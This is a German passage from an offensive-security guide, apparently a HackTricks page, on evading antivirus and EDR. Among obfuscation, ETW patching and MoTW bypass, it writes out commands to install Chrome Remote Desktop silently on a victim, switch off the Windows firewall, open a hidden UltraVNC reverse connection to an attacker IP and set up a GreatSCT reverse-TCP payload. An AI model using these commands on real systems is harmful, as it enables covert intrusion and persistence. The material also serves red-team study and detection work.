- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der Ansatz, den Cobalt Strikes `powerpick` verwendet). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Verschleierung

> [!TIP]
> Mehrere Verschleierungstechniken basieren auf der Verschlüsselung von Daten. Dadurch steigt die Entropie der Binärdatei, was ihre Erkennung durch AVs und EDRs erleichtert. Sei dabei vorsichtig und wende die Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### ConfuserEx-geschützte .NET-Binärdateien entschleiern

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu **originales IL** wieder her, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenrumpf* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol-/Kontrollfluss-Wiederherstellung – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx 2-Profil auswählen
     • de4dot macht control-flow flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch schlanke Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt solltest du normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* Payload zu finden. Oft speichert die Malware sie als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Mit dieser Kette wird der Ausführungsfluss wiederhergestellt, **ohne** das bösartige Sample ausführen zu müssen – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für mehr Softwaresicherheit sorgen kann.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich die Sprache `C++11/14` nutzen lässt, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne externe Tools zu verwenden oder den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogrammierungsframework generiert werden und es Personen, die die Anwendung cracken möchten, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphischen Code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation in von LLVM unterstützten Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden, wodurch unsere natürliche Vorstellung eines normalen Kontrollflusses untergraben wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET PE Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in shellcode umwandeln und anschließend laden.

### LLVM compiler-assisted per-function self-masking

Anstatt ein gesamtes Implantat nur während einer Ruhephase zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen immer dann mit XOR maskieren, wenn sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode ein und erzeugt einen gemeinsamen Masking-Handler in `.text`; Signaturen auf Source-Ebene und die Windows-x64-Calling-Convention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Diese Transformation gehört hinter die Instruktionsauswahl und Optimierung, da sie **jeden ausgegebenen Return** berücksichtigen und das genaue x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Belasse alle vom Compiler generierten Stack-/Frame-Abbauinstruktionen, die einem Return vorausgehen; leite nur die Return-Instruktion selbst um.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die zwischen den Ausgabestufen geteilt werden, ermöglichen es einem Prolog-Branch, auf seinen späteren Epilog zu zielen. Für ein manuell ausgegebenes nahes `je` schreibe `0F 84`, gefolgt vom vier Byte langen MC-Ausdruck `target - address_after_je`. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts verändert hat; der PoC gibt in diesem Fall fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

Der PoC legt einen XOR-Schlüssel und 16 Byte große Records in `.funcmeta` ab, die einen vom Loader relocierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler bei Record-Offset `+8` auf ein QWORD zu und liest damit die Länge sowie deren Padding; anschließend rückt er jeweils um `0x10` weiter. PE-Section-Namen sind nur acht Byte lang, daher sieht die Laufzeitabfrage `.funcmet`. Ein externer Patcher fügt ein ausführbares `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image Base über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und läuft vor dem CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Bei der Initialisierung wird ein Sentinel in `gs:[0xE8]` gesetzt und jede Metadata-Funktion aufgerufen. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Body. Der Epilog verwendet dann `call handler`; nachdem der Handler 13 Register (`0x68` Byte) gespeichert hat, ist die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den Metadata-Record geschrieben werden. Der Stub löscht den Sentinel und springt zu `ImageBase + original_entry_point_RVA`, nachdem alle Bodies maskiert wurden.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Body zu decodieren. Der letzte Pfad fällt in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`. Nach dem erneuten Maskieren verarbeitet das `ret` des Handlers daher die Rücksprungadresse des ursprünglichen Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Der Handler findet den aktuellen Record, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), ändert den Schutz des restlichen Codes zu `PAGE_EXECUTE_READWRITE`, XORt ihn Byte für Byte mit dem niederwertigen Schlüsselbyte und setzt den Schutz anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife decodiert den Code somit beim Eintritt und codiert ihn bei jedem normalen Exit.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub` und eine `.funcmet`-Section mit einem Schlüssel sowie relocierten Zeigern auf `.text`;
- das Parsen von PEB, Import-Tabelle und Section-Tabelle vor dem CRT, gefolgt von Aufrufen über jeden Metadata-Zeiger;
- identische PIC-Prologe mit `call`/`pop` und zahlreiche Return-Adressen, die zu einem einzigen Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen in ausführbare, image-backed Pages.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält den ursprünglichen unverschlüsselten Body weiterhin, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion dumpen. Das Ein-Byte-XOR, die lesbaren Metadata-Daten und die feste Grenze von `0x46` machen auch eine Offline-Wiederherstellung unkompliziert.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, die modifizierten Code-Pages jedoch prozessweit. Gleichzeitige oder rekursive Aufrufe können daher Instruktionen erneut umschalten, während eine andere Invocation sie gerade ausführt. Auch Exceptions und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den über `lpflOldProtect` zurückgegebenen tatsächlichen Schutz wiederherstellen, hart codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf die x64-Stack-Ausrichtung prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Aufrufer für die Kohärenz des Instruktionscaches verantwortlich ist, wenn ausführbarer Code modifiziert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht ist dir dieser Bildschirm schon einmal begegnet, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen verwendet hauptsächlich einen reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und so den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann allerdings weiterhin über „Weitere Informationen“ -> „Trotzdem ausführen“ gestartet werden).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch zusammen mit der URL erstellt wird, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS einer aus dem Internet heruntergeladenen Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass mit einem **vertrauenswürdigen** Signaturzertifikat signierte ausführbare Dateien **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads Mark of The Web erhalten, besteht darin, sie in einen Container wie eine ISO-Datei zu packen. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container packt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ETW jedoch auch verwenden, um schädliche Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses so zu ändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher so gepatcht, dass sie sofort zurückkehrt und die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binärdateien im Speicher zu laden, ist schon seit geraumer Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne auf die Festplatte zuzugreifen, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird **ein neuer, entbehrlicher Prozess gestartet**, dein schädlicher Post-Exploitation-Code in diesen Prozess injiziert, ausgeführt und der neue Prozess anschließend beendet. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet: Wenn bei einer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, ist die **Wahrscheinlichkeit deutlich höher**, dass unser **Implant überlebt**. Der Nachteil ist, dass die **Wahrscheinlichkeit höher ist**, von **verhaltensbasierten Erkennungen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der schädliche Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der dann von AV gescannt wird. Der Nachteil ist jedoch, dass bei einem Fehler während der Ausführung deiner Payload die **Wahrscheinlichkeit deutlich höher ist**, deinen **Beacon zu verlieren**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den zugehörigen InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Herkömmliche `execute-assembly`-Techniken enthalten weiterhin erkennbares MSIL und initialisieren schließlich eine CLR. **WasmForge** ändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR noch den JIT oder den `dotnet`-Host des Ziels. Daher bieten Regeln, die sich ausschließlich auf Namen verwalteter Assemblies, das Laden der CLR, AMSI oder .NET ETW stützen, keine direkte Sichtbarkeit mehr. Dies ist eine Umgehungs- und Verpackungstechnik, keine Umgehung einer Berechtigungsgrenze – der Gastprozess behält die Berechtigungen des ursprünglichen Tools und dessen beobachtbares Verhalten auf Betriebssystemebene bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Pfad ist die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, das WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build mit einem einzigen Befehl führt Migration, Kompatibilitätsanpassung, WASM-Kompilierung, PE-Erstellung und Signierung aus.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Zur Fehlerbehebung oder Überprüfung des generierten Codes lässt sich der Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` aufteilen. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu umgehen und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging von wasm32-C# zu x64-Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI bietet Windows-orientierte BCL-Features entweder nicht oder verändert sie, und ein wasm32-Gast reserviert normalerweise vier Byte große Zeigerslots, während x64-APIs acht Byte große Zeiger zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Schichten:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und Ähnliches an `Wf*`-Hilfsfunktionen weiter.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Mappings, damit `[DllImport]`-Aufrufe an verknüpfte C-Bridge-Symbole gebunden werden, statt die angegebene DLL dynamisch im Gast zu laden.
3. Hostgebundene Zeiger verwenden in C# `ulong` und in C `uint64_t`. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; eine `out8_mask` markiert echte acht Byte große Ausgabe-Slots, deren obere Hälften erhalten bleiben müssen. Nicht markierte Ausgaben im wasm32-Format werden durch Snapshot/Restore geschützt, damit ein Schreibzugriff von x64 nicht die angrenzenden vier Byte beschädigt.
4. Dedizierte Host-Bridges übernehmen Operationen, die sich nicht für den generischen Syscall-Dispatch eignen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Verkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Hostadressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge acht Byte große Ausgabe-Slots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übersetzt die Zeiger und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Erkennungspunkte

Code mit vielen Reflection-Aufrufen, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin tool-spezifische Patches erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können auch No-op-Stubs erreichen, daher verwenden unterstützte Tools protokollspezifische Host-Shims. Validieren Sie jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Die Technik verlagert Telemetrie, statt die Payload unsichtbar zu machen. Die Erkennung kann sich auf ein PE verlagern, das ein WASM-Modul enthält oder materialisiert, auf Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Speicherzuweisungen und -kopiervorgänge zwischen Host und Guest, generische direkte Win32-Aufrufe, Anomalien bei Signaturen und PE-Ressourcen sowie die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Fehlen von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Indem Sie Zugriff auf die Interpreter-Binärdateien und die Umgebung auf der SMB-Freigabe gewähren, können Sie **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Laut Repository scannt Defender die Skripte weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analyse

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token-Stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie EDR oder AV. Das Einschränken der Token-Berechtigungen kann dazu führen, dass der Prozess weiterläuft, aber keine privilegierten Prüf- oder Abhilfemaßnahmen mehr ausführen kann.

Um dies zu verhindern, könnte Windows **externen Prozessen** den Zugriff auf die Tokens von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend dazu verwenden, diesen zu übernehmen und Persistenz einzurichten:<sup>[[35]](#references)</sup>
1. Laden Sie die Datei von https://remotedesktop.google.com/ herunter, klicken Sie auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führen Sie das Installationsprogramm unbemerkt auf dem Opferrechner aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehren Sie zur Chrome-Remote-Desktop-Seite zurück und klicken Sie auf „Next“. Der Assistent fordert Sie dann zur Autorisierung auf. Klicken Sie auf die Schaltfläche „Authorize“, um fortzufahren.
4. Führen Sie den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN ohne Verwendung der GUI fest).
 

## Erweiterte Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehungstechniken sind ein sehr komplexes Thema. Manchmal müssen Sie zahlreiche verschiedene Telemetriequellen in einem einzigen System berücksichtigen. In ausgereiften Umgebungen ist es daher praktisch unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie vorgehen, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Umgehungstechniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ebenfalls ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über tiefgreifende Umgehungstechniken.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und diesen für Sie isoliert.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred). Der Dienst wird auch über eine offene Weboberfläche unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) angeboten.

### **Telnet-Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den Sie (als Administrator) folgendermaßen installieren konnten:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lass es beim Systemstart **starten** und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opfercomputer**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit er bereit ist, eine umgekehrte **VNC-Verbindung** entgegenzunehmen. Auf dem **Opfercomputer**: Starte den winvnc-Daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um unauffällig zu bleiben, solltest du Folgendes vermeiden:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png).
- Führe nicht `winvnc -h` aus, um die Hilfe aufzurufen, sonst wird ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
